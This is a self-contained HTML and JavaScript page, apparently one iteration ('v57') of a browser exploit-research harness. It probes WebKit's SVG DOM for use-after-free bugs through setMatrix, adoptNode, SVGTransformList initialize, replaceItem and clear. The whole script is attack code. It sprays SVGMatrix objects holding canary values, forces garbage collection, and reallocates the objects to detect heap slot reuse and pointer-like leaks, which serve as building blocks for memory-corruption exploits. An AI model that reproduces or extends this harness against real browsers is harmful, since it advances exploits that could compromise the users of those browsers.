<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>SVG UAF v57 — ref-drop primitives: setMatrix/adoptNode/detach</title>
<style>
*{box-sizing:border-box}
body{background:#0a0a0a;color:#e0e0e0;font-family:monospace;font-size:12px;padding:12px;margin:0}
h2{color:#00ff88;margin:6px 0;font-size:14px}
#controls{display:flex;flex-wrap:wrap;gap:6px;margin-bottom:10px}
button{background:#1a1a2e;color:#00ff88;border:1px solid #00ff88;padding:6px 12px;font-family:monospace;font-size:12px;cursor:pointer;border-radius:3px}
button:active{background:#00ff88;color:#0a0a0a}
button.run-all{background:#003300;border-color:#00ff88;font-weight:bold}
button.copy-btn{background:#1a1a2e;border-color:#00aaff;color:#00aaff}
button.copy-btn:active{background:#00aaff;color:#0a0a0a}
button.clear-btn{border-color:#ff4444;color:#ff4444}
#out{border:1px solid #222;padding:8px;min-height:100px;max-height:70vh;overflow-y:auto}
pre{white-space:pre-wrap;word-break:break-all;margin:1px 0;line-height:1.4}
.hit{color:#00ff88}.miss{color:#ff4444}.warn{color:#ffaa00}.info{color:#888}
.suite-hdr{color:#00aaff;margin-top:6px}
#copy-toast{position:fixed;bottom:20px;right:20px;background:#00aaff;color:#000;padding:6px 14px;border-radius:4px;font-family:monospace;font-size:12px;opacity:0;transition:opacity 0.2s;pointer-events:none}
</style>
</head>
<body>
<h2>SVG UAF v57 — ref-drop: setMatrix / adoptNode / SVGTransformList.initialize</h2>
<div id="controls">
  <button class="run-all" onclick="runAll()">▶ Run All</button>
  <button onclick="runSuite('ADR21')">ADR21: SVGTransformList.initialize ref-drop</button>
  <button onclick="runSuite('ADR22')">ADR22: document.adoptNode C++ detach</button>
  <button onclick="runSuite('ADR23')">ADR23: setMatrix copy-and-forget</button>
  <button onclick="runSuite('ADR24')">ADR24: SVGMatrix via replaceItem canary</button>
  <button class="copy-btn" onclick="copyAll()">⎘ Copy All</button>
  <button class="clear-btn" onclick="clearOut()">✕ Clear</button>
</div>
<div id="out"></div>
<div id="copy-toast">Copied!</div>
<script>
var SVG_NS='http://www.w3.org/2000/svg';
function L(s,cls){
  var d=document.getElementById('out');
  var p=document.createElement('pre');
  if(cls)p.className=cls;
  p.textContent=s;
  d.appendChild(p);
  d.scrollTop=d.scrollHeight;
}
function clearOut(){document.getElementById('out').innerHTML='';}
function copyAll(){
  var lines=document.getElementById('out').querySelectorAll('pre');
  var text=Array.from(lines).map(function(p){return p.textContent;}).join('\n');
  var toast=document.getElementById('copy-toast');
  try{
    navigator.clipboard.writeText(text).then(function(){
      toast.style.opacity='1';setTimeout(function(){toast.style.opacity='0';},1500);
    }).catch(function(){fallbackCopy(text,toast);});
  }catch(e){fallbackCopy(text,toast);}
}
function fallbackCopy(text,toast){
  var ta=document.createElement('textarea');ta.value=text;
  ta.style.cssText='position:fixed;top:-9999px;left:-9999px';
  document.body.appendChild(ta);ta.select();
  try{document.execCommand('copy');toast.style.opacity='1';setTimeout(function(){toast.style.opacity='0';},1500);}
  catch(e){L('Copy failed: '+e.message,'miss');}
  document.body.removeChild(ta);
}

// ── shared helpers ──────────────────────────────────────────────
var _dv=new DataView(new ArrayBuffer(8));
function f64bits(f){_dv.setFloat64(0,f,true);return{lo:_dv.getUint32(0,true),hi:_dv.getUint32(4,true)};}
function f64hex(f){var b=f64bits(f);return'0x'+b.hi.toString(16).padStart(8,'0')+b.lo.toString(16).padStart(8,'0');}
function isPointerLike(f){
  if(!isFinite(f)||isNaN(f)||f<=0)return false;
  return f>=(1<<28)&&f<Math.pow(2,48);
}
function makeSVG(){
  var svg=document.createElementNS(SVG_NS,'svg');
  svg.setAttribute('width','2');svg.setAttribute('height','2');
  svg.style.cssText='position:fixed;top:-9999px;left:-9999px;opacity:0;pointer-events:none';
  document.body.appendChild(svg);
  return svg;
}
function removeSVG(svg){if(svg&&svg.parentNode)svg.parentNode.removeChild(svg);}
function gcPressure(n){
  var g=[];
  for(var i=0;i<(n||100000);i++) g.push({x:i,s:''+i,a:[i]});
  g=null;
}
function gcHard(){
  gcPressure(500000);
  var t=new Array(200000).fill(null).map(function(){return new Object();});t=null;
  gcPressure(300000);
  try{var ab=new ArrayBuffer(1024*1024*8);ab=null;}catch(e){}
  gcPressure(200000);
}

// Make a fresh SVGTransform with a matrix, return {svg, g, xf, matrix}
function makeTransformMatrix(svg){
  var g=document.createElementNS(SVG_NS,'g');
  svg.appendChild(g);
  var xf=svg.createSVGTransform();
  g.transform.baseVal.appendItem(xf);
  var m=g.transform.baseVal.getItem(0).matrix;
  return {g:g, xf:g.transform.baseVal.getItem(0), list:g.transform.baseVal, matrix:m};
}

// inverse oracle — ref-counts new SVGMatrix, immediately orphans it
function inverseOracle(K){
  var svg=makeSVG();
  var g=document.createElementNS(SVG_NS,'g');svg.appendChild(g);
  var xf=svg.createSVGTransform();g.transform.baseVal.appendItem(xf);
  var m=g.transform.baseVal.getItem(0).matrix;
  m.a=1/K;m.b=0;m.c=0;m.d=K;m.e=0;m.f=0;
  var inv=m.inverse();
  var result=inv.a;
  g.transform.baseVal.removeItem(0);
  g.parentNode.removeChild(g);removeSVG(svg);
  return result;
}

// ─────────────────────────────────────────────────────────────────
// ADR23 — setMatrix() copy-and-forget ref-drop
//
// SVGTransform.setMatrix(SVGMatrix m) is specced as:
//   "Set the transform type to SVG_TRANSFORM_MATRIX, with parameter
//    matrix defining the new transformation. Note that the values
//    from the parameter matrix are copied."
//
// "Values from the parameter matrix are COPIED" — if this is a true
// copy with no retained ref, then after setMatrix() returns:
//   - the transform's internal AffineTransform has the values
//   - the original SVGMatrix C++ object's refcount drops by 1
//   - if that was the last ref (only JS wrapper held it), it goes to 0
//   - IsoHeap slot freed
//   - NEXT alloc of an SVGMatrix might get that slot
//
// Strategy:
//   1. Alloc SVGMatrix M, write canary float64 values
//   2. Call someTransform.setMatrix(M) — triggers the copy
//   3. Drop M (null the variable) + drop the transform
//   4. GC pressure
//   5. Alloc fresh SVGMatrix, check for canary
// ─────────────────────────────────────────────────────────────────
function runADR23(){
  L('','suite-hdr');L('ADR23: setMatrix() copy-and-forget ref-drop');

  var svg=makeSVG();
  var CANARY_A=8.88888888e13;
  var CANARY_E=7.77777777e13;
  var N=300;

  // Test 1: confirm setMatrix copies values
  var t=makeTransformMatrix(svg);
  var mSrc=svg.createSVGMatrix();
  mSrc.a=CANARY_A;mSrc.b=1.11;mSrc.c=2.22;mSrc.d=CANARY_A/2;mSrc.e=CANARY_E;mSrc.f=CANARY_E/2;
  t.xf.setMatrix(mSrc);
  var mAfter=t.list.getItem(0).matrix;
  L('ADR23: [T1] after setMatrix: mAfter.a='+mAfter.a+' mSrc.a='+mSrc.a+' copied='+(mAfter.a===mSrc.a));
  L('ADR23: [T1] mAfter.e='+mAfter.e+' mSrc.e='+mSrc.e+' copied='+(mAfter.e===mSrc.e));
  // Modify mSrc after setMatrix — if truly copied, mAfter should NOT change
  var oldA=mAfter.a;
  mSrc.a=999999;
  L('ADR23: [T1] after mSrc.a=999999: mAfter.a='+mAfter.a+' unchanged='+(mAfter.a===oldA)+' (true=deep copy, false=shared ref!)');
  t.g.parentNode.removeChild(t.g);

  // Test 2: THE KEY TEST — canary spray via setMatrix path
  // Phase A: spray N matrices, call setMatrix for each, then drop ALL refs
  L('ADR23: [T2] spraying '+N+' matrices via setMatrix path...');
  (function phaseA(){
    var svgInner=makeSVG();
    // One reusable transform target
    var g=document.createElementNS(SVG_NS,'g');svgInner.appendChild(g);
    var xf=svgInner.createSVGTransform();g.transform.baseVal.appendItem(xf);
    var xfRef=g.transform.baseVal.getItem(0);

    for(var k=0;k<N;k++){
      var m=svg.createSVGMatrix();
      m.a=CANARY_A+k;m.b=1.5+k*0.001;m.c=2.5+k*0.001;m.d=CANARY_A-k;m.e=CANARY_E+k*2;m.f=CANARY_E+k*3;
      // "Copy" the matrix into the transform — drops C++ ref if it's a real copy
      xfRef.setMatrix(m);
      // m goes out of scope — if setMatrix deep-copied, C++ ref count may hit 0
    }
    // Also drop the transform
    g.transform.baseVal.removeItem(0);
    g.parentNode.removeChild(g);
    removeSVG(svgInner);
    // xfRef goes out of scope too
  })();

  gcHard();

  L('ADR23: [T2] GC done, allocating '+N+' fresh standalone matrices...');
  var hits=[];
  for(var k=0;k<N;k++){
    var mNew=svg.createSVGMatrix();
    var snap={a:mNew.a,b:mNew.b,c:mNew.c,d:mNew.d,e:mNew.e,f:mNew.f};
    if(snap.a!==1||snap.b!==0||snap.c!==0||snap.d!==1||snap.e!==0||snap.f!==0){
      hits.push(k);
      if(hits.length<=8){
        L('ADR23: ★ fresh['+k+']: a='+snap.a+' e='+snap.e+' '+f64hex(snap.e),'hit');
        L('ADR23:   bits a='+f64hex(snap.a)+' d='+f64hex(snap.d),'hit');
      }
    }
    for(var field of['a','b','c','d','e','f']){
      if(isPointerLike(snap[field])){
        L('ADR23: ★★ ['+k+'].'+field+'='+snap[field]+' PTR-LIKE! oracle='+inverseOracle(snap[field]),'hit');
      }
    }
  }
  L('ADR23: [T2] dirty='+hits.length+'/'+N+(hits.length>0?' ★ REF DROPPED!':'clean — setMatrix retains ref'));

  // Test 3: same but using transform-path matrix as the source
  L('ADR23: [T3] setMatrix with transform-path orphan as source...');
  (function phaseB(){
    for(var k=0;k<N;k++){
      var svgB=makeSVG();
      var g=document.createElementNS(SVG_NS,'g');svgB.appendChild(g);
      var xf=svgB.createSVGTransform();g.transform.baseVal.appendItem(xf);
      var m=g.transform.baseVal.getItem(0).matrix;
      m.a=CANARY_A+k;m.b=3.5+k*0.001;m.c=4.5+k*0.001;m.d=CANARY_A-k;m.e=CANARY_E+k*4;m.f=CANARY_E+k*5;

      // Get a second transform to call setMatrix on
      var g2=document.createElementNS(SVG_NS,'g');svgB.appendChild(g2);
      var xf2=svgB.createSVGTransform();g2.transform.baseVal.appendItem(xf2);
      var xfRef2=g2.transform.baseVal.getItem(0);
      xfRef2.setMatrix(m);

      // Drop everything — removeItem first to drop list's ref, then DOM removal
      g.transform.baseVal.removeItem(0);
      g2.transform.baseVal.removeItem(0);
      g.parentNode.removeChild(g);
      g2.parentNode.removeChild(g2);
      removeSVG(svgB);
      // m, xfRef2 out of scope
    }
  })();

  gcHard();

  var hits3=[];
  for(var k=0;k<N;k++){
    var mNew2=svg.createSVGMatrix();
    var snap={a:mNew2.a,b:mNew2.b,c:mNew2.c,d:mNew2.d,e:mNew2.e,f:mNew2.f};
    if(snap.a!==1||snap.b!==0||snap.c!==0||snap.d!==1||snap.e!==0||snap.f!==0){
      hits3.push(k);
      if(hits3.length<=8){
        L('ADR23: [T3] ★ fresh['+k+']: e='+snap.e+' '+f64hex(snap.e),'hit');
        for(var field of['a','b','c','d','e','f']){
          if(isPointerLike(snap[field])) L('ADR23: [T3] ★★ PTR-LIKE! '+field+'='+snap[field],'hit');
        }
      }
    }
  }
  L('ADR23: [T3] dirty='+hits3.length+'/'+N+(hits3.length>0?' ★ REF DROPPED!':'clean'));

  removeSVG(svg);
  L('ADR23: done');
}

// ─────────────────────────────────────────────────────────────────
// ADR21 — SVGTransformList.initialize() ref-drop
//
// SVGTransformList.initialize(newItem) spec:
//   "Clears all existing current items from the list and re-initializes
//    the list to hold the single item specified by the parameter."
//
// When the list is cleared, all internal SVGTransform C++ objects
// held by the list should have their refcounts decremented.
// If a JS wrapper was the ONLY remaining ref to any of those objects,
// they get freed.
//
// Strategy: build a list with many transforms, get their matrices,
// call initialize() to clear the list, then check if the C++ matrix
// objects are still readable/reusable.
// ─────────────────────────────────────────────────────────────────
function runADR21(){
  L('','suite-hdr');L('ADR21: SVGTransformList.initialize() ref-drop');

  var svg=makeSVG();
  var CANARY=9.99999999e13;
  var N=200;

  // Test 1: basic initialize() behavior
  var g=document.createElementNS(SVG_NS,'g');svg.appendChild(g);
  var list=g.transform.baseVal;
  // Build 5 transforms
  var matrices=[];
  for(var i=0;i<5;i++){
    var xf=svg.createSVGTransform();
    list.appendItem(xf);
    var m=list.getItem(i).matrix;
    m.a=10+i;m.e=100+i;
    matrices.push(m);
  }
  L('ADR21: [T1] list.length before initialize='+list.length);
  L('ADR21: [T1] matrices[0].a='+matrices[0].a+' matrices[4].a='+matrices[4].a);

  // initialize() with a fresh transform
  var freshXf=svg.createSVGTransform();
  list.initialize(freshXf);
  L('ADR21: [T1] list.length after initialize='+list.length+' (expected 1)');

  // Are the old matrices still readable?
  L('ADR21: [T1] matrices[0].a after initialize='+matrices[0].a+' (still alive: '+(matrices[0].a===10)+')');
  L('ADR21: [T1] matrices[4].a after initialize='+matrices[4].a+' (still alive: '+(matrices[4].a===14)+')');
  // Can we still WRITE to them?
  try{
    matrices[0].a=999;
    L('ADR21: [T1] matrices[0].a after write='+matrices[0].a+' writable='+(matrices[0].a===999));
  }catch(ex){L('ADR21: [T1] write threw: '+ex.message,'warn');}

  // Test 2: initialize() then GC → check if old matrix C++ freed
  // Strategy: build list, grab matrix refs, call initialize(), null refs, GC, alloc fresh
  L('ADR21: [T2] large spray: '+N+' transforms, initialize(), GC, read fresh...');
  (function phase2(){
    var svgB=makeSVG();
    var gB=document.createElementNS(SVG_NS,'g');svgB.appendChild(gB);
    var listB=gB.transform.baseVal;
    for(var k=0;k<N;k++){
      var xf=svgB.createSVGTransform();
      listB.appendItem(xf);
      var m=listB.getItem(k).matrix;
      m.a=CANARY+k;m.b=1.1+k*0.001;m.c=2.2+k*0.001;m.d=CANARY-k;m.e=CANARY+k*2;m.f=CANARY+k*3;
    }
    L('ADR21: [T2] list.length='+listB.length+' after spray');
    // initialize() to clear all N transforms from the list
    var singleton=svgB.createSVGTransform();
    listB.initialize(singleton);
    L('ADR21: [T2] list.length='+listB.length+' after initialize()');
    // Drop remaining refs
    gB.parentNode.removeChild(gB);
    removeSVG(svgB);
    // All matrix refs out of scope here
  })();

  gcHard();

  var hits2=[];
  for(var k=0;k<N;k++){
    var mNew=svg.createSVGMatrix();
    var snap={a:mNew.a,b:mNew.b,c:mNew.c,d:mNew.d,e:mNew.e,f:mNew.f};
    if(snap.a!==1||snap.b!==0||snap.c!==0||snap.d!==1||snap.e!==0||snap.f!==0){
      hits2.push(k);
      if(hits2.length<=8){
        L('ADR21: ★ fresh['+k+']: a='+snap.a+' e='+snap.e+' '+f64hex(snap.e),'hit');
        for(var field of['a','b','c','d','e','f']){
          if(isPointerLike(snap[field])) L('ADR21: ★★ PTR! '+field+'='+snap[field]+' oracle='+inverseOracle(snap[field]),'hit');
        }
      }
    }
  }
  L('ADR21: [T2] dirty='+hits2.length+'/'+N+(hits2.length>0?' ★ REF DROPPED!':'clean'));

  // Test 3: SVGNumberList.initialize() — same pattern for SVGNumberList
  // SVGNumber is in a DIFFERENT IsoHeap bucket (smaller) but same logic applies
  var flt=document.createElementNS(SVG_NS,'feColorMatrix');
  flt.setAttribute('type','matrix');
  svg.appendChild(flt);
  var numList=flt.values.baseVal;
  var nums=[];
  var NCANARY=3.141592653589793;
  for(var k=0;k<N;k++){
    numList.appendItem(svg.createSVGNumber());
    var n=numList.getItem(k);
    n.value=NCANARY+k*0.001;
    nums.push(n);
  }
  L('ADR21: [T3] SVGNumberList.length='+numList.length);
  var freshNum=svg.createSVGNumber();freshNum.value=0;
  numList.initialize(freshNum);
  L('ADR21: [T3] after initialize(): length='+numList.length);
  L('ADR21: [T3] nums[0].value='+nums[0].value+' (alive='+(Math.abs(nums[0].value-NCANARY)<0.0001)+')');
  // null refs, GC, alloc fresh SVGNumbers and check
  for(var k=0;k<nums.length;k++) nums[k]=null;
  nums=null;
  gcHard();
  var numHits=0;
  for(var k=0;k<N;k++){
    var nn=svg.createSVGNumber();
    if(nn.value!==0){
      numHits++;
      if(numHits<=5) L('ADR21: ★ SVGNumber['+k+'].value='+nn.value+' bits='+f64hex(nn.value),'hit');
    }
  }
  L('ADR21: [T3] dirty SVGNumbers='+numHits+'/'+N+(numHits>0?' ★ NUM REUSE!':'clean'));

  g.parentNode.removeChild(g);
  removeSVG(svg);
  L('ADR21: done');
}

// ─────────────────────────────────────────────────────────────────
// ADR22 — document.adoptNode() C++ detach probe
//
// When an SVG element is adopted into a different document:
// - The element's C++ SVGElement::didMoveToNewDocument() fires
// - This calls clearContextElement() on all associated JS wrappers
// - clearContextElement() severs the wrapper's back-pointer to the SVGElement
// - Potentially drops the Ref<> the element held to its child objects
//
// If this drops the SVGMatrix's refcount, the C++ AffineTransform
// could be freed while the JS wrapper still has an opaque (null) ref.
// Reading the wrapper's .a/.e etc. after adopt might either:
//   a) return stale data (C++ freed, reading freed memory!)
//   b) crash/throw
//   c) return zeros (WebKit zeroed on free)
//   d) still work (contextElement cleared but Ref<> not dropped)
// ─────────────────────────────────────────────────────────────────
function runADR22(){
  L('','suite-hdr');L('ADR22: document.adoptNode() C++ detach probe');

  var svg=makeSVG();

  // Test 1: can we adoptNode an SVG element?
  try{
    var iframe=document.createElement('iframe');
    iframe.style.cssText='position:fixed;top:-9999px;left:-9999px;width:1px;height:1px';
    document.body.appendChild(iframe);
    var iframeDoc=iframe.contentDocument;
    L('ADR22: [T1] iframe doc created: '+(!!iframeDoc));

    // Make SVG in main doc, grab matrix
    var svg2=makeSVG();
    var g=document.createElementNS(SVG_NS,'g');svg2.appendChild(g);
    var xf=svg2.createSVGTransform();g.transform.baseVal.appendItem(xf);
    var m=g.transform.baseVal.getItem(0).matrix;
    m.a=1234.5678;m.b=0;m.c=0;m.d=8765.4321;m.e=0x1b0dead00;m.f=0x1b0cafe00;
    L('ADR22: [T1] pre-adopt: m.e='+m.e+' bits='+f64hex(m.e));

    // Adopt the SVG element into iframe document
    var adopted=iframeDoc.adoptNode(g);
    L('ADR22: [T1] adoptNode succeeded, node.ownerDocument===iframe: '+(adopted.ownerDocument===iframeDoc));

    // Now read the matrix — does it still work?
    try{
      var aAfter=m.a;
      var eAfter=m.e;
      L('ADR22: [T1] post-adopt: m.a='+aAfter+' m.e='+eAfter);
      L('ADR22: [T1] m.a changed='+(aAfter!==1234.5678)+' m.e changed='+(eAfter!==0x1b0dead00));
      if(aAfter!==1234.5678||eAfter!==0x1b0dead00){
        L('ADR22: ★ post-adopt values differ! a='+aAfter+' e='+eAfter,'hit');
      }
      // Try writing to it
      m.a=99999;
      L('ADR22: [T1] post-adopt write: m.a='+m.a+' (writable='+(m.a===99999)+')');
    }catch(ex){
      L('ADR22: [T1] ★ post-adopt read/write THREW: '+ex.message,'hit');
    }

    // Test 2: adopt the entire SVG
    var svg3=makeSVG();
    var g3=document.createElementNS(SVG_NS,'g');svg3.appendChild(g3);
    var xf3=svg3.createSVGTransform();g3.transform.baseVal.appendItem(xf3);
    var m3=g3.transform.baseVal.getItem(0).matrix;
    m3.a=5555.5555;m3.e=0x2b0dead00;
    L('ADR22: [T2] pre-adopt full SVG: m3.a='+m3.a+' m3.e='+m3.e);

    var adoptedSVG=iframeDoc.adoptNode(svg3);
    L('ADR22: [T2] adopted full SVG, owner===iframe: '+(adoptedSVG.ownerDocument===iframeDoc));
    try{
      var a3=m3.a;var e3=m3.e;
      L('ADR22: [T2] post-adopt: a3='+a3+' e3='+e3);
      if(a3!==5555.5555||e3!==0x2b0dead00){
        L('ADR22: [T2] ★ values changed! a3='+a3+' e3='+e3,'hit');
      }
    }catch(ex){L('ADR22: [T2] ★ THREW: '+ex.message,'hit');}

    // Test 3: adopt, then drop DOM refs, GC, alloc fresh → check reuse
    L('ADR22: [T3] adopt + GC + fresh alloc...');
    var CANARY=6.66666666e14;
    var N=200;
    (function phase3(){
      var svgC=makeSVG();
      var matrices=[];
      for(var k=0;k<N;k++){
        var gC=document.createElementNS(SVG_NS,'g');svgC.appendChild(gC);
        var xfC=svgC.createSVGTransform();gC.transform.baseVal.appendItem(xfC);
        var mC=gC.transform.baseVal.getItem(0).matrix;
        mC.a=CANARY+k;mC.b=0.1+k*0.001;mC.c=0.2+k*0.001;mC.d=CANARY-k;mC.e=CANARY+k*3;mC.f=CANARY+k*4;
        matrices.push(mC);
      }
      // Adopt entire SVG into iframe — triggers mass detach
      var adoptedC=iframeDoc.adoptNode(svgC);
      L('ADR22: [T3] adopted '+N+'-matrix SVG, checking matrix[0].a='+matrices[0].a+' (canary='+(CANARY+0)+')');
      // Now null all refs + GC
      for(var k=0;k<matrices.length;k++) matrices[k]=null;
      matrices=null;
      // Also remove from iframe
      if(adoptedC.parentNode) adoptedC.parentNode.removeChild(adoptedC);
    })();

    gcHard();

    var hits3=[];
    for(var k=0;k<N;k++){
      var mNew=svg.createSVGMatrix();
      var snap={a:mNew.a,b:mNew.b,c:mNew.c,d:mNew.d,e:mNew.e,f:mNew.f};
      if(snap.a!==1||snap.b!==0||snap.c!==0||snap.d!==1||snap.e!==0||snap.f!==0){
        hits3.push(k);
        if(hits3.length<=8){
          L('ADR22: [T3] ★ fresh['+k+']: a='+snap.a+' e='+snap.e+' '+f64hex(snap.e),'hit');
          for(var field of['a','b','c','d','e','f']){
            if(isPointerLike(snap[field])) L('ADR22: [T3] ★★ PTR! '+field+'='+snap[field],'hit');
          }
        }
      }
    }
    L('ADR22: [T3] dirty='+hits3.length+'/'+N+(hits3.length>0?' ★ ADOPT DROPS REF!':'clean'));

    document.body.removeChild(iframe);
  }catch(ex){
    L('ADR22: iframe/adoptNode failed: '+ex.message,'warn');
  }

  removeSVG(svg);
  L('ADR22: done');
}

// ─────────────────────────────────────────────────────────────────
// ADR24 — SVGTransformList.replaceItem() canary churn
//
// replaceItem(newItem, index) spec:
//   "Replaces an existing item in the list with a new item."
//
// When we replaceItem, the old item is removed from the list.
// If the list held the only Ref<> to the old SVGTransform's matrix,
// that matrix's C++ refcount might drop to 0.
//
// Strategy: build a list, fill it, grab matrices for each slot,
// replaceItem repeatedly (cycling through N new transforms),
// check if old matrices get freed.
//
// BONUS: test if the RETURNED old matrix from replaceItem has its
// C++ ref still valid, or if it's been freed.
// ─────────────────────────────────────────────────────────────────
function runADR24(){
  L('','suite-hdr');L('ADR24: SVGTransformList.replaceItem() churn + old-item ref-drop');

  var svg=makeSVG();
  var CANARY=1.23456789e14;
  var N=200;

  // Test 1: replaceItem returns the inserted item (new) or old?
  var g=document.createElementNS(SVG_NS,'g');svg.appendChild(g);
  var list=g.transform.baseVal;
  var xf0=svg.createSVGTransform();list.appendItem(xf0);
  var m0=list.getItem(0).matrix;m0.a=111.111;m0.e=222.222;

  var xfNew=svg.createSVGTransform();
  var returned=list.replaceItem(xfNew,0);
  L('ADR24: [T1] replaceItem returned: '+(returned===xfNew?'newItem (inserted)':'old item or other'));
  L('ADR24: [T1] list.length='+list.length);
  var mAfterReplace=list.getItem(0).matrix;
  L('ADR24: [T1] list[0].matrix.a after replace='+mAfterReplace.a+' (expected identity=1)');
  L('ADR24: [T1] old m0.a still='+m0.a+' (alive='+(m0.a===111.111)+')');
  g.parentNode.removeChild(g);

  // Test 2: rapid replaceItem churn — 200 matrices cycled out
  L('ADR24: [T2] churn '+N+' matrices via replaceItem...');
  (function phase2(){
    var svgB=makeSVG();
    var gB=document.createElementNS(SVG_NS,'g');svgB.appendChild(gB);
    var listB=gB.transform.baseVal;

    // Seed with one slot
    var seed=svgB.createSVGTransform();listB.appendItem(seed);

    for(var k=0;k<N;k++){
      var mCurrent=listB.getItem(0).matrix;
      mCurrent.a=CANARY+k;mCurrent.b=0.5+k*0.001;mCurrent.c=1.5+k*0.001;
      mCurrent.d=CANARY-k;mCurrent.e=CANARY+k*5;mCurrent.f=CANARY+k*6;

      // Replace item 0 with a fresh transform — kicks the old one out
      var xfFresh=svgB.createSVGTransform();
      listB.replaceItem(xfFresh,0);
      // mCurrent JS ref goes out of scope next iteration
    }
    // Drop everything
    gB.transform.baseVal.removeItem(0);
    gB.parentNode.removeChild(gB);
    removeSVG(svgB);
  })();

  gcHard();

  var hits=[];
  for(var k=0;k<N;k++){
    var mNew=svg.createSVGMatrix();
    var snap={a:mNew.a,b:mNew.b,c:mNew.c,d:mNew.d,e:mNew.e,f:mNew.f};
    if(snap.a!==1||snap.b!==0||snap.c!==0||snap.d!==1||snap.e!==0||snap.f!==0){
      hits.push(k);
      if(hits.length<=8){
        L('ADR24: ★ fresh['+k+']: a='+snap.a+' e='+snap.e+' '+f64hex(snap.e),'hit');
        for(var field of['a','b','c','d','e','f']){
          if(isPointerLike(snap[field])) L('ADR24: ★★ PTR! '+field+'='+snap[field]+' oracle='+inverseOracle(snap[field]),'hit');
        }
      }
    }
  }
  L('ADR24: [T2] dirty='+hits.length+'/'+N+(hits.length>0?' ★ REF DROPPED!':'clean'));

  // Test 3: SVGTransformList.clear() — explicitly clear all items
  L('ADR24: [T3] SVGTransformList.clear() ref-drop...');
  (function phase3(){
    var svgC=makeSVG();
    var gC=document.createElementNS(SVG_NS,'g');svgC.appendChild(gC);
    var listC=gC.transform.baseVal;
    for(var k=0;k<N;k++){
      var xfC=svgC.createSVGTransform();listC.appendItem(xfC);
      var mC=listC.getItem(k).matrix;
      mC.a=CANARY+k;mC.b=2.5;mC.c=3.5;mC.d=CANARY-k;mC.e=CANARY+k*7;mC.f=CANARY+k*8;
    }
    L('ADR24: [T3] list.length='+listC.length+' before clear');
    listC.clear();
    L('ADR24: [T3] list.length='+listC.length+' after clear');
    gC.parentNode.removeChild(gC);
    removeSVG(svgC);
  })();

  gcHard();

  var hits3=[];
  for(var k=0;k<N;k++){
    var mN3=svg.createSVGMatrix();
    var snap={a:mN3.a,b:mN3.b,c:mN3.c,d:mN3.d,e:mN3.e,f:mN3.f};
    if(snap.a!==1||snap.b!==0||snap.c!==0||snap.d!==1||snap.e!==0||snap.f!==0){
      hits3.push(k);
      if(hits3.length<=8){
        L('ADR24: [T3] ★ fresh['+k+']: a='+snap.a+' e='+snap.e+' '+f64hex(snap.e),'hit');
        for(var field of['a','b','c','d','e','f']){
          if(isPointerLike(snap[field])) L('ADR24: [T3] ★★ PTR! '+field+'='+snap[field],'hit');
        }
      }
    }
  }
  L('ADR24: [T3] clear() dirty='+hits3.length+'/'+N+(hits3.length>0?' ★ CLEAR DROPS REF!':'clean'));

  removeSVG(svg);
  L('ADR24: done');
}

// ─────────────────────────────────────────────────────────────────
// RUN ALL
// ─────────────────────────────────────────────────────────────────
var suites={ADR21:runADR21,ADR22:runADR22,ADR23:runADR23,ADR24:runADR24};
function runSuite(name){
  L('=== '+name+' ===','suite-hdr');
  try{suites[name]();}catch(ex){L(name+' UNCAUGHT: '+ex.message+'\n'+(ex.stack||''),'miss');}
  L('=== '+name+' done ===','info');
}
function runAll(){
  clearOut();
  L('SVG UAF v57 — ref-drop primitives','suite-hdr');
  L('----------------------------------------------------');
  var names=Object.keys(suites);
  var i=0;
  function next(){
    if(i>=names.length){L('','suite-hdr');L('ALL SUITES COMPLETE');return;}
    runSuite(names[i++]);
    setTimeout(next,150);
  }
  next();
}
</script>
